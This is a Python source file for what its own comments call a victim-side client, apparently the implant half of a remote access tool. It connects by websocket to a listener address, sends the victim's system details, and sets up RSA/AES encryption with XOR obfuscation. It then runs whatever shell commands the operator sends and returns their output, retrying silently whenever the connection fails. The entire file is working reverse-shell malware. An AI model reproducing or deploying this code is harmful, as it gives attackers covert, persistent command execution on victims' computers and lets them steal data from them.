import asyncio
import websockets
import subprocess
import os
import base64
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Random import get_random_bytes
from Cryptodome.PublicKey import RSA
import json
import info


# Encryption
def encrypt(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    cipher_text, tag = cipher.encrypt_and_digest(data)
    nonce = cipher.nonce
    return base64.b64encode(nonce + tag + cipher_text)  # type: ignore


# Decryption
def decrypt(data, aes_key):
    data = base64.b64decode(data)
    nonce, tag, cipher_text = data[:16], data[16:32], data[32:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(cipher_text, tag).decode()


# For xor obfuscation for secure packets.
def xor_sec(data):

    xor_key = '_!cipher@#'
    return bytes([b ^ ord(xor_key[i % len(xor_key)]) for i, b in enumerate(data)])


# Victim handler.
async def connector():

    url = 'ws://127.0.0.1:443'

    while True:

        try:

            # Connect websocket proxy.
            async with websockets.connect(url) as websocket:  # type: ignore

                # Send victim system details.
                sys_info = info.check()
                await websocket.send(xor_sec(sys_info.encode())) # type: ignore

                # To know listener is connected.
                data = await websocket.recv()
                result = json.loads(xor_sec(data).decode())  # type: ignore

                if 'select' in result:

                    # Generate RSA key pair.
                    key = RSA.generate(2048)
                    private_key = key
                    public_key = key.public_key()

                    # Receive listener's public key.
                    data = await websocket.recv()
                    msg = json.loads(xor_sec(data).decode())  # type: ignore

                    if 'pubkey' in msg:
                        listener_pubkey = RSA.import_key(
                            base64.b64decode(msg['pubkey']))

                        # Send victim's public key.
                        await websocket.send(xor_sec(json.dumps({
                            'pubkey': base64.b64encode(public_key.export_key()).decode()}).encode()))

                        # Generate and send AES key.
                        aes_key = get_random_bytes(16)
                        cipher_rsa = PKCS1_OAEP.new(
                            listener_pubkey)  # type: ignore
                        encrypted_aes_key = cipher_rsa.encrypt(aes_key)

                        await websocket.send(xor_sec(json.dumps({
                            'AES-key': base64.b64encode(encrypted_aes_key).decode()}).encode()))

                        # Data send and recieve section.
                        while True:

                            enc_data = await websocket.recv()
                            command = decrypt(enc_data, aes_key)

                            if 'cd ' in command:
                                os.chdir(command[3:].strip())
                                result = f'[+] Directory changed to {os.getcwd()}'

                            elif 'info' in command:
                                result = info.info()

                            elif 'exit' in command:
                                break

                            else:
                                proc = subprocess.run(
                                    command, shell=True, capture_output=True, text=True)
                                result = proc.stdout or proc.stderr or '[+] Command executed.'

                            await websocket.send(encrypt(result.encode(), aes_key))

        except:
            await asyncio.sleep(3)

asyncio.run(connector())
